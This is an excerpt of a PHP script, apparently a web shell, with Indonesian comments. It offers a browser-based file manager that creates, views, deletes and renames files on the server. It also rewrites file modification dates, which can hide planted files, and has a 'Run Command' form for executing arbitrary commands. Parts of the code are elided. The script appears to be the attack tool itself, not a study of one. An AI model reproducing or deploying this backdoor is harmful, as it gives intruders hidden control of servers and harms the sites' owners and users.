...
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['folder_name']) && !empty($_POST['folder_name'])) {
        $newFolder = $currentDirectory . '/' . htmlspecialchars($_POST['folder_name']);
        ...
        $fileToDelete = $currentDirectory . '/' . htmlspecialchars($_POST['delete_file']);
    ...
    } elseif (isset($_POST['edit_date']) && isset($_POST['file_name']) && isset($_POST['new_date'])) {
        $fileName = $currentDirectory . '/' . htmlspecialchars($_POST['file_name']);
        $newDate = DateTime::createFromFormat('Y-m-d\TH:i', $_POST['new_date']);
        if ($newDate !== false) { // Validasi format tanggal
            $timestamp = $newDate->getTimestamp();
            if (file_exists($fileName)) {
                if (touch($fileName, $timestamp)) {
                    echo '<hr>Date modified successfully!';
                } else {
                    echo '<hr>Error: Failed to modify date!';
                }
            } else {
                echo '<hr>Error: File not found!';
            }
        } else {
            echo '<hr>Error: Invalid date format!';
        }
    } elseif (isset($_POST['rename_item']) && isset($_POST['old_name']) && isset($_POST['new_name'])) {
        $oldName = $currentDirectory . '/' . htmlspecialchars($_POST['old_name']);
        $newName = $currentDirectory . '/' . htmlspecialchars($_POST['new_name']);
        ...
        $fileToView = $currentDirectory . '/' . htmlspecialchars($_POST['view_file']);
        if (file_exists($fileToView)) {
            $fileContent = file_get_contents($fileToView);
            $viewCommandResult = '<hr><p>Result: ' . htmlspecialchars($_POST['view_file']) . '</p><textarea class="result-box">' . htmlspecialchars($fileContent) . '</textarea>';
        } else {
...
echo "Waktu server saat ini: " . date('Y-m-d H:i:s')."<br>";
...
echo '<br>';
echo '<hr><form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? htmlspecialchars($_SERVER['QUERY_STRING']) : '').'">';
echo '<input type="text" name="folder_name" placeholder="New Folder Name">';
echo '<input type="submit" value="Create Folder">';
echo '</form>';
echo '<form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? htmlspecialchars($_SERVER['QUERY_STRING']) : '').'">';
...
echo '</form>';
echo '<form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? htmlspecialchars($_SERVER['QUERY_STRING']) : '').'"><input type="text" name="cmd_input" placeholder="Enter command"><input type="submit" value="Run Command"></form>';
echo $viewCommandResult;
echo '<div>';
echo '</div>';
echo '<div class="menu-file-manager">';
...
foreach (scandir($currentDirectory) as $v) {
    ...
    echo '<tr>
            ...
            <td><form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? htmlspecialchars($_SERVER['QUERY_STRING']) : '').'"><input type="hidden" name="view_file" value="'.htmlspecialchars($v).'"><input type="submit" value=" View  "></form></td>
            <td><form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? htmlspecialchars($_SERVER['QUERY_STRING']) : '').'"><input type="hidden" name="delete_file" value="'.htmlspecialchars($v).'"><input type="submit" value="Delete "></form></td>
            <td><form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? htmlspecialchars($_SERVER['QUERY_STRING']) : '').'"><input type="hidden" name="old_name" value="'.htmlspecialchars($v).'"><input type="text" name="new_name" placeholder="New Name"><input type="submit" name="rename_item" value="Rename"></form>
            </td>
        </tr>';
}
